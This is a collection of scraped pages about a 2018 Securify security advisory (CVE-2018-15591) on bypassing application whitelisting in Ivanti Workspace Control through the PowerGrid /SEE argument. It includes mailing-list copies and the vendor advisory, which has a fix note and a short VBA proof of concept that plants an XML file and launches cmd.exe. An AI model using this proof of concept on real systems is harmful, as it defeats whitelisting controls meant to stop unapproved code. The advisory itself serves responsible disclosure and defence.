=== Content from packetstormsecurity.com_abe7810d_20250124_233640.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from seclists.org_8c308a98_20250124_233641.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16.png)](5)

[![Previous](/images/left-icon-16x16.png)](3)
[By Thread](index.html#4)
[![Next](/images/right-icon-16x16.png)](5)

![](/shared/images/nst-icons.svg#search)

# Ivanti Workspace Control Application Whitelist bypass via PowerGrid /SEE command line argument

---

*From*: "Securify B.V. via Fulldisclosure" <fulldisclosure () seclists org>

*Date*: Mon, 1 Oct 2018 17:29:06 +0200

---

```

------------------------------------------------------------------------
Ivanti Workspace Control Application Whitelist bypass via PowerGrid /SEE
command line argument
------------------------------------------------------------------------
Yorick Koster, August 2018

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
It was found that the PowerGrid application can be used to run arbitrary
commands via the /SEE command line option. An attacker can abuse this
issue to bypass Application Whitelisting in order to run arbitrary code
on the target machine.

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully verified on Ivanti Workspace Control version
10.2.950.0.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This issue is mitigated in Ivanti Workspace Control version 10.3.0.0.
The fix included in this version prevents the creation of XML files
within the WMTemp folder, effectively preventing this issue from being
exploited.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
<https://www.securify.nl/advisory/SFY20180806/ivanti-workspace-control-application-whitelist-bypass-via-powergrid-_see-command-line-argument.html>

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](3)
[By Date](date.html#4)
[![Next](/images/right-icon-16x16.png)](5)

[![Previous](/images/left-icon-16x16.png)](3)
[By Thread](index.html#4)
[![Next](/images/right-icon-16x16.png)](5)

### Current thread:

* **Ivanti Workspace Control Application Whitelist bypass via PowerGrid /SEE command line argument** *Securify B.V. via Fulldisclosure (Oct 01)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from community.ivanti.com_3aacd746_20250124_233642.html ===


![](/files/we_are.png)

The current resource is moved permanently. We're redirecting you to the same document on our new Community Website...



=== Content from seclists.org_ba83d280_20250124_233642.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![bugtraq logo](/images/bugtraq-logo.png)](/bugtraq/)
## [Bugtraq](/bugtraq/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](9)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](9)

![](/shared/images/nst-icons.svg#search)

# Ivanti Workspace Control Application Whitelist bypass via PowerGrid /SEE command line argument

---

*From*: "Securify B.V." <lists () securify nl>

*Date*: Mon, 1 Oct 2018 17:29:16 +0200

---

```

------------------------------------------------------------------------
Ivanti Workspace Control Application Whitelist bypass via PowerGrid /SEE
command line argument
------------------------------------------------------------------------
Yorick Koster, August 2018

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
It was found that the PowerGrid application can be used to run arbitrary
commands via the /SEE command line option. An attacker can abuse this
issue to bypass Application Whitelisting in order to run arbitrary code
on the target machine.

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully verified on Ivanti Workspace Control version
10.2.950.0.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
This issue is mitigated in Ivanti Workspace Control version 10.3.0.0.
The fix included in this version prevents the creation of XML files
within the WMTemp folder, effectively preventing this issue from being
exploited.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
<https://www.securify.nl/advisory/SFY20180806/ivanti-workspace-control-application-whitelist-bypass-via-powergrid-_see-command-line-argument.html>

```

---

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](9)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](9)

### Current thread:

* **Ivanti Workspace Control Application Whitelist bypass via PowerGrid /SEE command line argument** *Securify B.V. (Oct 01)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.securify.nl_323cda72_20250124_233643.html ===
[Securify home](/)Menu![contact](https://www.datocms-assets.com/21957/1585735393-phone-call.svg)Bel ons![contact](https://www.datocms-assets.com/21957/1585735542-letter.svg)Mail ons

* [Code](/diensten/agile-security/)
* [Pentesten](/diensten/pentesting/)
* [Organisatie](/diensten/red-teaming/)
* [Publicaties](/artikelen/)
* [Over ons](/over-ons/)
nl

* [en](/en/advisory/ivanti-workspace-control-application-whitelist-bypass-via-powergrid-see-command-line-argument/)
* [nl](/advisory/ivanti-workspace-control-application-whitelist-bypass-via-powergrid-see-command-line-argument/)
#### Advisory

![](data:image/svg+xml;charset=utf-8...)![](data:image/jpg;base64...)![Lego guy]()![Lego guy](https://www.datocms-assets.com/21957/1590679367-67u8va6x400x400.jpg?auto=format&dpr=0.24&w=400)**Yorick Koster**August 6, 2018
# Ivanti Workspace Control Application Whitelist bypass via PowerGrid /SEE command line argument

#### Spring naar

* [Abstract](/advisory/ivanti-workspace-control-application-whitelist-bypass-via-powergrid-see-command-line-argument/#abstract)
* [See also](/advisory/ivanti-workspace-control-application-whitelist-bypass-via-powergrid-see-command-line-argument/#see-also)
* [Tested versions](/advisory/ivanti-workspace-control-application-whitelist-bypass-via-powergrid-see-command-line-argument/#tested-versions)
* [Fix](/advisory/ivanti-workspace-control-application-whitelist-bypass-via-powergrid-see-command-line-argument/#fix)
* [Introduction](/advisory/ivanti-workspace-control-application-whitelist-bypass-via-powergrid-see-command-line-argument/#introduction)
* [Details](/advisory/ivanti-workspace-control-application-whitelist-bypass-via-powergrid-see-command-line-argument/#details)
* [Proof of concept](/advisory/ivanti-workspace-control-application-whitelist-bypass-via-powergrid-see-command-line-argument/#proof-of-concept)
## Abstract

It was found that the *PowerGrid* application can be used to run arbitrary commands via the `/SEE` command line option. An attacker can abuse this issue to bypass Application Whitelisting in order to run arbitrary code on the target machine.

## See also

[CVE-2018-15591](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15591)
[DOC-69684](https://forums.ivanti.com/s/article/A-locally-authenticated-user-with-low-privileges-can-bypass-Application-Whitelisting-by-leveraging-multiple-unspecified-attack-vectors) - A locally authenticated user with low privileges can bypass Application Whitelisting by leveraging multiple unspecified attack vectors
[DOC-69682](https://forums.ivanti.com/s/article/Ivanti-Workspace-Control-Files-and-Folders-Security-has-been-improved) - Ivanti Workspace Control Files and Folders Security has been improved

## Tested versions

This issue was successfully verified on Ivanti Workspace Control version 10.2.950.0.

## Fix

This issue is mitigated in Ivanti Workspace Control version [10.3.0.0](https://community.ivanti.com/docs/DOC-69853). The fix included in this version prevents the creation of XML files within the WMTemp folder, effectively preventing this issue from being exploited.

## Introduction

[Ivanti Workspace Control](https://www.ivanti.com/products/workspace-control) (formerly known as RES ONE Workspace) is a User Environment Management solution. It contains a number of security features, one of which being Application Whitelisting. Application Whitelisting can be used to only allow approved applications to execute. Whitelisting can be configured in various ways; in Workspace Control a common used method is to whitelist based on path. As of Workspace Control version 10.1 it also is possible to whitelist based on signing certificate.

By design a number of Workspace Control executables are exempted from Application Whitelisting. One of these applications is the PowerGrid application (*pwrgrid.exe*). It was found that it is possible to use PowerGrid to run any arbitrary application by using the `/SEE` command line argument. In order to do so the attacker needs to abuse [another vulnerability](/advisory/SFY20180803/ivanti-workspace-control-data-security-bypass-via-localhost-unc-path.html) in Workspace Control. When successfully exploit it allows the attacker to bypass Application Whitelisting.

## Details

Workspace Control creates a temporary folder `WMTemp` under the logged on user's `AppData` folder. This folder is protected by the *FileGuard* Minifilter driver, meaning that the logged on user is not allowed to create or modify files within this folder. Some Workspace Control applications will create XML files in this folder, which is allowed by FileGuard. These XML files contain commands that need to be started by PowerGrid. After the XML file is created, PowerGrid is invoked with the `/SEE` command line argument, and the file name of the XML file that needs to be processed. PowerGrid will load the file from the `WMTemp` folder, and run the command as is configured in the XML file.

Normally, FileGuard will prevent the execution of arbitrary commands, because the user can't create any new files within the `WMTemp` folder. By abusing [another vulnerability](/advisory/SFY20180803/ivanti-workspace-control-data-security-bypass-via-localhost-unc-path.html) in Workspace Control it is possible to bypass FileGuard to create XML files within the WMTemp file. By doing so it is possible for an attacker to bypass Application Whitelisting in order to run arbitrary commands.

## Proof of concept

The VBA code below demonstrates this issue. The code tries to run `cmd.exe` using the `/SEE` command line argument.

```
Private Declare PtrSafe Function GetCurrentProcessId Lib "kernel32.dll" () As Integer
Private Declare PtrSafe Function ProcessIdToSessionId Lib "kernel32.dll" (ByVal dwProcessId As Integer, ByRef pSessionId As Integer) As Integer

Private Sub PowerGridAWLBypass()
	On Error Resume Next
	Dim SessionID As Integer
	Dim appDataPath, resPath
	If ProcessIdToSessionId(GetCurrentProcessId, SessionID) = 0 Then
		SessionID = 1
	End If
	appDataPath = Replace(UCase(Environ("LOCALAPPDATA")), "C:", "\\localhost\C$")
	resPath = Environ("RESPFDIR")
	Dim fso As Object
	Set fso = CreateObject("Scripting.FileSystemObject")
	Dim oFile As Object
	Set oFile = fso.CreateTextFile(appDataPath & "\RES\WM\" & SessionID & "\WMTemp\foo.xml")
	oFile.WriteLine "<foo><file>cmd.exe</file><showcmd>5</showcmd></foo>"
	oFile.Close
	Set fso = Nothing
	Set oFile = Nothing
	Shell resPath & "\pwrgrid.exe /SEE foo.xml", vbNormalFocus
End Sub

```
## Vragen of feedback?

Bel ons![contact](https://www.datocms-assets.com/21957/1585735393-phone-call.svg)Mail ons![contact](https://www.datocms-assets.com/21957/1585735542-letter.svg)[![Securify logo](https://www.datocms-assets.com/21957/1589468815-imglogofullwhite.svg)Securify home](/)

**Kantoor:**

Naritaweg 132

1043 CA Amsterdam

**Telefoon:** +31 20 82 04 516

**Mail:** info@securify.nl

**KvK nummer:** 58043624

**Responsible Disclosure:**

rd@securify.nl

**GPG:** 2CC6 9E7A 7CEC E259 2FCC BF92 EC11 E0AC 0101 CC82

* [Events](/evenementen/)
* [LinkedIn](https://www.linkedin.com/company/securify-group)
* [Twitter](https://twitter.com/securifybv)
* [Jobs](https://securifybv.recruitee.com/)
* [Privacy Policy](/privacy-policy/)
* [Terms](/voorwaarden/)
© 2024 Securify BV


